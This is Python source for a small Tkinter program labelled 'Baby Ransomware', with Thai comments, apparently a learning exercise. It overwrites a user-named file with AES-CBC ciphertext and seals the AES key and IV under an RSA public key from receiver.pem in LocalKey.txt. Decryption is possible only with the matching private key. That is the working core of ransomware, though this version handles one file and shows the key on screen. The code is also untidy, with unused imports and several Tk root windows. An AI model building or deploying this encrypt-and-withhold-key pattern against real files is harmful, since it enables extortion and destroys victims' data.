from cgitb import text
from distutils import command
from secrets import token_bytes
from Crypto.Random import get_random_bytes
import base64
from Crypto.PublicKey import RSA
import json
from base64 import b16decode, b16encode, b32decode, b32encode, b64decode
from secrets import token_bytes
from Crypto.Cipher import AES,PKCS1_OAEP
from Crypto.Util.Padding import pad,unpad
from Crypto.Random import get_random_bytes
from tkinter import *
from tkinter import ttk
import os,random,struct
import hashlib

# Running

key = get_random_bytes(32)
root = Tk()
root.title("Baby Ransomware")
iv_out = StringVar()
key_out = StringVar()
# function encrypt
def encrypt(fname):
    cipher = AES.new(key,AES.MODE_CBC)
    #print(fname) # check name
    with open(f'{fname}','rb') as origin_file:
        original = origin_file.read()
    
    ct_bytes = cipher.encrypt(pad(original,AES.block_size))
    
    with open(f'{fname}','wb') as encrypted_file:
        encrypted_file = encrypted_file.write(ct_bytes)
    
    iv = b32encode(cipher.iv).decode('utf-8')
    ct = b32encode(ct_bytes).decode('utf-8')
    # fix เพิ่มการแสดง iv,key ทางหน้าจอ เพื่อการเช็คเฉยๆ
    print(len(cipher.iv)) #เช็ค size iv เฉยๆ
    print("iv is : ",cipher.iv)
    print("key is : ",key)
    k=b32encode(key).decode('utf-8')
    iv_out.set(cipher.iv)
    key_out.set(key)
    
    
    # เริ่ม rsa encrypt
    data=json.dumps({'iv':iv,'key':k}).encode('ascii')
    file_out = open("LocalKey.txt", "wb")
    #[ file_out.write(data)]

    recipient_key = RSA.import_key(open("receiver.pem").read())
    session_key = get_random_bytes(16)

    # Encrypt the session key with the public RSA key
    cipher_rsa = PKCS1_OAEP.new(recipient_key)
    enc_session_key = cipher_rsa.encrypt(session_key)

    # Encrypt the data with the AES session key
    cipher_aes = AES.new(session_key, AES.MODE_EAX)
    ciphertext, tag = cipher_aes.encrypt_and_digest(data)
    [ file_out.write(x) for x in (enc_session_key, cipher_aes.nonce, tag, ciphertext) ]
    file_out.close()


def decrypt(fname,pri_key):
    # เริ่ม decrypt RSA
    file_in = open("LocalKey.txt", "rb")

    #private_key = RSA.import_key(open("private.pem").read())
    private_key = RSA.import_key(pri_key)

    enc_session_key, nonce, tag, ciphertext = \
        [ file_in.read(x) for x in (private_key.size_in_bytes(), 16, 16, -1) ]

    # Decrypt the session key with the private RSA key
    cipher_rsa = PKCS1_OAEP.new(private_key)
    session_key = cipher_rsa.decrypt(enc_session_key)

    # Decrypt the data with the AES session key
    cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
    data = cipher_aes.decrypt_and_verify(ciphertext, tag)
    file_out = open("LocalKey.txt", "wb")
    [ file_out.write(data)]
    file_out.close()
    
    
    # Print AES,IV 
    print(data.decode("utf-8"))
    
    # แปลง
    try:
        b64 = json.loads(data)
        iv = b32decode(b64['iv'])
        aes_key = b32decode(b64['key'])
        
        with open(f'{fname}','rb') as encrypted_file:
            encrypted = encrypted_file.read()
        
        cipher = AES.new(aes_key,AES.MODE_CBC,iv)
        pt = unpad(cipher.decrypt(encrypted), AES.block_size)
        
        with open(f'{fname}','wb') as decrypted_file:
            decrypted_file.write(pt)
        
        
        
        return pt.decode('ascii')
    except (ValueError,KeyError):
        return False
    
# GUI

# ข้อความหน้าจอ
myLabel1 = Label(root,text="Baby Ransomware",fg="white",font=20,bg="black").pack()
myLabel2 = Label(root,text="Please choose mode",fg="black").pack()

    
def openModeEncrypt():
    
    # display 2
    modeEncrypt = Tk()
    file_name_in = StringVar(modeEncrypt)
    modeEncrypt.title("Mode Encryption")
    modeEncrypt.geometry("800x500")
    
    # function clear
    def clearMode():
        et0.delete(0,END)
        et1.delete(0,END)
        et2.delete(0,END)
    # function calculate
    def calEncryption():
        txt = file_name_in.get()
        encrypt(txt)
        #print(key_out_enc)
        #print(key_out_enc.get())
        et1.insert(0,key_out.get())
        et2.insert(0,iv_out.get())
        
    # Header
    Label(modeEncrypt,text="Encryption Mode",fg="white",font=20,bg="red").pack()
    # Input
    Label(modeEncrypt,text="",font=5).pack()
    Label(modeEncrypt,text="Please Enter your file's name",fg="black",font=10,).pack()
    et0=Entry(modeEncrypt,font=30,width=54,textvariable=file_name_in)
    et0.pack()

    # Button Calculate
    Button(modeEncrypt,text="Encryption",fg="white",bg="grey",command=calEncryption).pack()
    
    # Output
    Label(modeEncrypt,text="",font=5).pack()
    Label(modeEncrypt,text="AES key",fg="black",font=10,).pack()
    et1=Entry(modeEncrypt,width=100,textvariable=key_out)
    et1.pack()
    Label(modeEncrypt,text="",font=5).pack()
    Label(modeEncrypt,text="IV",fg="black",font=10).pack()
    et2=Entry(modeEncrypt,font=30,width=54,textvariable=iv_out)
    et2.pack()
    # Button Clear
    Label(modeEncrypt,text="",font=5).pack()
    Button(modeEncrypt,text="Clear All",fg="white",bg="black",command=clearMode).pack()
    root.mainloop()
    
def openModeDecrypt():
    # display 3
    modeDecrypt = Tk()
    modeDecrypt.title("Mode Decryption")
    modeDecrypt.geometry("800x500")
    file_name_in = StringVar(modeDecrypt)
    pri_key = StringVar(modeDecrypt)
    
    # function calculate
    def calDecryption():
        txt = file_name_in.get()
        pk = pri_key.get()
        decrypt(txt,pk)
        et2.insert(0,key_out.get())
    # function clear
    def clearMode():
        et0.delete(0,END)
        et1.delete(0,END)
        et2.delete(0,END)
    
    # Header
    Label(modeDecrypt,text="Decryption Mode",fg="white",font=20,bg="green").pack()
    
    # Input
    Label(modeDecrypt,text="",font=5).pack()
    Label(modeDecrypt,text="Please Enter your file's name",fg="black",font=10,).pack()
    et0=Entry(modeDecrypt,font=30,width=54,textvariable=file_name_in)
    et0.pack() 
    Label(modeDecrypt,text="",font=5).pack()
    Label(modeDecrypt,text="Please Enter your key ",fg="black",font=10,).pack()
    et1=Entry(modeDecrypt,width=100,textvariable=pri_key)
    et1.pack()
    
    # Output
    Label(modeDecrypt,text="",font=5).pack()
    Label(modeDecrypt,text="AES key",fg="black",font=10,).pack()
    et2=Entry(modeDecrypt,width=100,textvariable=key_out)
    et2.pack()
    
    # Button Calculate
    Label(modeDecrypt,text="",font=1).pack()
    Button(modeDecrypt,text="Decryption",fg="white",bg="grey",command=calDecryption).pack()
    # Button Clear
    Label(modeDecrypt,text="",font=5).pack()
    Button(modeDecrypt,text="Clear All",fg="white",bg="black",command=clearMode).pack()
    root.mainloop()

# ใส่ปุ่ม function
btn1 = Button(root,text="Encryption",fg="white",bg="red",command=openModeEncrypt).pack()
btn2 = Button(root,text="Decryption",fg="white",bg="green",command=openModeDecrypt).pack()
# กำหนดขนาดและตำแหน่งหน้าจอ
root.geometry("300x150")



# ปิด
root.mainloop()